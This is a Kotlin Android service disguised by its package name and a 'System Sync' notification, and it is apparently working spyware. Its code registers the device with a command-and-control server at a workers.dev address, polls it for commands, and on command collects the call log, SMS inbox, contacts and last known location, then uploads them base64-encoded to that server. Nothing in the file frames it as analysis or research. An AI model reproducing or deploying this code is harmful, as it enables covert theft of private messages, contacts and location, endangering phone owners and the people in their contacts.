package com.system.sync

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Base64
import androidx.core.app.NotificationCompat
import okhttp3.*
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class CoreService : Service() {
    private val BASE = "https://c2.vonkarsen903.workers.dev"
    private val client = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private var deviceId: String = ""
    private var running = true

    override fun onCreate() {
        super.onCreate()
        startForeground(1, buildNotification())
        deviceId = register()
        Thread { beaconLoop() }.start()
    }

    private fun buildNotification(): Notification {
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel("sync", "Sync", NotificationManager.IMPORTANCE_LOW)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
        val chId = if (Build.VERSION.SDK_INT >= 26) "sync" else ""
        return NotificationCompat.Builder(this, chId)
            .setContentTitle("System Sync")
            .setContentText("Keeping data in sync")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun register(): String {
        val info = JSONObject()
            .put("model", Build.MODEL)
            .put("brand", Build.BRAND)
            .put("sdk", Build.VERSION.SDK_INT)
            .put("manufacturer", Build.MANUFACTURER)
        val body = JSONObject().put("info", info).toString()
        val req = Request.Builder()
            .url("$BASE/register")
            .post(body.toRequestBody("application/json".toMediaType()))
            .build()
        return try {
            client.newCall(req).execute().use { r ->
                if (!r.isSuccessful) return ""
                val json = JSONObject(r.body!!.string())
                json.getString("device_id")
            }
        } catch (e: Exception) {
            ""
        }
    }

    private fun beaconLoop() {
        while (running) {
            try {
                if (deviceId.isEmpty()) {
                    deviceId = register()
                    Thread.sleep(5000)
                    continue
                }
                val body = JSONObject().put("device_id", deviceId).toString()
                val req = Request.Builder()
                    .url("$BASE/beacon")
                    .post(body.toRequestBody("application/json".toMediaType()))
                    .build()
                client.newCall(req).execute().use { r ->
                    if (r.code == 404) {
                        deviceId = register()
                    } else if (r.isSuccessful) {
                        val json = JSONObject(r.body!!.string())
                        val cmds = json.getJSONArray("commands")
                        for (i in 0 until cmds.length()) {
                            handleCommand(cmds.getJSONObject(i))
                        }
                    }
                }
            } catch (e: Exception) {}
            Thread.sleep(15000)
        }
    }

    private fun handleCommand(cmd: JSONObject) {
        when (cmd.getString("cmd")) {
            "dump_calls"    -> dumpCalls()
            "dump_sms"      -> dumpSms()
            "dump_contacts" -> dumpContacts()
            "dump_loc"      -> dumpLocation()
        }
    }

    private fun upload(kind: String, data: ByteArray) {
        try {
            val b64 = Base64.encodeToString(data, Base64.NO_WRAP)
            val body = JSONObject()
                .put("device_id", deviceId)
                .put("kind", kind)
                .put("data", b64)
                .toString()
            val req = Request.Builder()
                .url("$BASE/upload")
                .post(body.toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().close()
        } catch (e: Exception) {}
    }

    private fun dumpCalls() {
        try {
            val arr = JSONArray()
            val cur = contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null,
                android.provider.CallLog.Calls.DATE + " DESC"
            )
            cur?.use {
                val num = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                val typ = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                val dur = it.getColumnIndex(android.provider.CallLog.Calls.DURATION)
                val dt = it.getColumnIndex(android.provider.CallLog.Calls.DATE)
                while (it.moveToNext()) {
                    arr.put(JSONObject()
                        .put("number", it.getString(num) ?: "")
                        .put("type", it.getInt(typ))
                        .put("duration", it.getLong(dur))
                        .put("date", it.getLong(dt)))
                }
            }
            upload("call", arr.toString().toByteArray())
        } catch (e: Exception) {}
    }

    private fun dumpSms() {
        try {
            val arr = JSONArray()
            val cur = contentResolver.query(
                android.net.Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC"
            )
            cur?.use {
                val addr = it.getColumnIndex("address")
                val body = it.getColumnIndex("body")
                val dt = it.getColumnIndex("date")
                while (it.moveToNext()) {
                    arr.put(JSONObject()
                        .put("address", it.getString(addr) ?: "")
                        .put("body", it.getString(body) ?: "")
                        .put("date", it.getLong(dt)))
                }
            }
            upload("sms", arr.toString().toByteArray())
        } catch (e: Exception) {}
    }

    private fun dumpContacts() {
        try {
            val arr = JSONArray()
            val cur = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            cur?.use {
                val name = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val num = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    arr.put(JSONObject()
                        .put("name", it.getString(name) ?: "")
                        .put("number", it.getString(num) ?: ""))
                }
            }
            upload("contacts", arr.toString().toByteArray())
        } catch (e: Exception) {}
    }

    private fun dumpLocation() {
        try {
            val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
            val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
            if (loc != null) {
                val json = JSONObject()
                    .put("lat", loc.latitude)
                    .put("lon", loc.longitude)
                    .put("acc", loc.accuracy)
                    .put("time", loc.time)
                    .toString()
                upload("location", json.toByteArray())
            }
        } catch (e: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        running = false
        super.onDestroy()
    }
}
